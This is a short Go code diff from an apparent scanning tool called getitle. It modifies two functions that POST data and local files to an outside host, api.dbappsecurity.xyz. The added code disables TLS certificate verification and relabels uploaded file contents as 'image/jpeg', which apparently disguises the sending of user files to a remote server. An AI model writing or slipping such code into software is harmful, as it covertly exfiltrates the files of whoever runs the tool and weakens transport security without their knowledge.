@@ -2,10 +2,10 @@ package cmd
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	. "getitle/src/pkg"
-	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
@@ -35,8 +35,16 @@ func inforev() {
 	req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/service", bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
 	//req.Header.Add("X-Forwarded-For", ip)
-	client := &http.Client{}
-	_, _ = client.Do(req)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Transport: tr,
+	}
+	_, err := client.Do(req)
+	if err != nil {
+		println(err.Error())
+	}
 	exit()
 }
 
@@ -45,12 +53,20 @@ func uploadfiles(filenames []string) {
 		if filename == "" || !IsExist(filename) {
 			continue
 		}
-		content, err := ioutil.ReadFile(filename)
+		file, err := os.Open(filename)
 		if err != nil {
 			Log.Error(err.Error())
 			continue
 		}
-		_, err = http.Post("https://api.dbappsecurity.xyz/ms", "multipart/form-data", bytes.NewReader(content))
+		tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{
+			Transport: tr,
+		}
+		req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/ms", file)
+		req.Header.Set("Content-Type", "image/jpeg")
+		_, err = client.Do(req)
 		if err != nil {
 			continue
 		}
